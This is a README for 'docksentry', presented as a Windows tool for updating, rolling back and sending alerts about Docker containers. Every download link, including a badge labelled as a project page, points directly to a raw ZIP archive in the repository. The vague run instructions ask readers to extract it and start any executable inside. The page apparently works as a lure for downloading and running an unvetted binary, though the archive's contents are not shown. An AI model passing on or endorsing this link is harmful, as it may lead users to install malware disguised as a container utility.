# 🛡️ docksentry - Keep Containers Updated With Ease

[![Download docksentry](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip)

## 📥 Download

Visit this page to download and set up docksentry:

https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip

## 🧰 What docksentry does

docksentry helps you manage Docker container updates on Windows. It checks for new container versions, updates them, and can roll back if something goes wrong. It also supports alerts through Telegram, Discord, webhooks, and a built-in web UI.

Use it if you want:
- simple container update control
- alerts when updates happen
- a way to undo a bad update
- support for multiple languages
- a web-based view of your update status

## 🖥️ What you need

Before you run docksentry on Windows, make sure you have:

- Windows 10 or Windows 11
- Docker Desktop installed
- Enough free disk space for your containers and images
- Internet access for update checks
- A Telegram account, Discord account, or webhook URL if you want alerts

If you plan to use the web UI, keep your browser ready. Any modern browser will work.

## 🚀 Getting Started

Follow these steps on Windows:

1. Open the download page:
   https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip

2. Look for the latest release or the main project files.

3. Download the Windows package or the file that matches the setup instructions on the project page.

4. If the file is a ZIP archive, extract it to a folder you can find again, such as:
   `C:\docksentry`

5. Open Docker Desktop and make sure it is running.

6. Start docksentry using the method shown in the project files. If the project includes a Windows executable, run it. If it uses Docker Compose, open PowerShell in the project folder and launch it with the provided compose file.

7. Wait for the first scan to finish. docksentry will then check your containers and show their status.

## ⚙️ First-time setup

When docksentry starts, it may ask for basic settings. These usually include:

- the containers you want to watch
- how often it checks for updates
- whether it should update containers on its own
- where to send alerts
- whether rollback should stay on or off

If a config file is included, open it with Notepad and set your preferred values. Save the file, then restart docksentry.

A simple first setup can look like this:
- watch only a few containers at first
- keep auto-update off until you confirm everything works
- turn on alerts so you can see update events
- enable rollback if you want a safety net

## 🔔 Alerts and notifications

docksentry can send update notices in several ways.

### Telegram
Connect a bot token and chat ID to get messages in Telegram. This works well if you want phone alerts.

### Discord
Add a Discord webhook URL or bot setting if the project uses one. This sends container events to your Discord server.

### Webhooks
Use webhooks if you want to connect docksentry to another app or script.

### Web UI
Open the built-in web interface in your browser to see update status, logs, and container activity in one place.

## 🧪 How updates work

docksentry checks your Docker containers for new versions. When it finds one, it can:
- notify you first
- pull the new image
- restart the container
- check if the container starts correctly
- roll back if the update fails

This helps reduce the risk of broken updates. You still keep control over what changes.

## 🔁 Rollback

Rollback gives you a path back to the last working container image.

Use it when:
- a new image fails to start
- a service loses access to its data
- the app begins to crash after an update
- you want to test updates with less risk

If rollback is enabled, docksentry stores enough state to return to the last known working version.

## 🌐 Languages

docksentry supports 16 languages. That makes it easier to use if English is not your main language.

You can switch the language in the app settings or config file, based on the setup method you use.

## 🧭 Using the web UI

If the web UI is enabled, open it in your browser after docksentry starts.

You can use it to:
- see which containers are tracked
- check the update state
- view logs
- confirm rollback activity
- review alert settings

If the page does not open at first, check that Docker Desktop is running and that the app service started without errors.

## 📁 Suggested folder layout

If you extract files by hand on Windows, keep them in a clean folder structure like this:

- `C:\docksentry\`
- `C:\docksentry\config\`
- `C:\docksentry\logs\`
- `C:\docksentry\data\`

This makes it easier to find settings and logs later.

## 🔧 Common setup checks

If docksentry does not seem to work, check these items:

- Docker Desktop is open
- your containers are already running
- the config file has the right names
- your notification settings are valid
- the web UI port is not used by another app
- the Windows firewall is not blocking the app

If the app includes a log file, open it first. Logs often show what failed and why.

## 🧾 Typical use cases

docksentry fits well if you want to:

- keep home server containers current
- watch updates for apps like dashboards, media tools, or reverse proxies
- get a message when a container updates
- avoid manual checks every day
- reduce the chance of broken updates with rollback

## 🪟 Windows run guide

For most Windows users, the process looks like this:

1. Download the project files from the link above.
2. Install Docker Desktop if you have not already.
3. Extract or open the project folder.
4. Start Docker Desktop.
5. Run docksentry the way the project files describe.
6. Open the web UI if it is included.
7. Add the containers you want to manage.
8. Turn on alerts or auto-update if you want hands-off use.

## 📌 What to expect after startup

After docksentry starts, you should see one or more of these:
- a status window
- a browser page for the web UI
- log output in a console window
- notification test messages if you enabled them

The first scan may take a short time. After that, docksentry will keep checking on the schedule you set.

## 🛠️ Project topics

This project focuses on:
- auto-update
- container
- discord
- docker
- docker-compose
- notifications
- rollback
- selfhosted
- telegram
- update
- web-ui
- webhook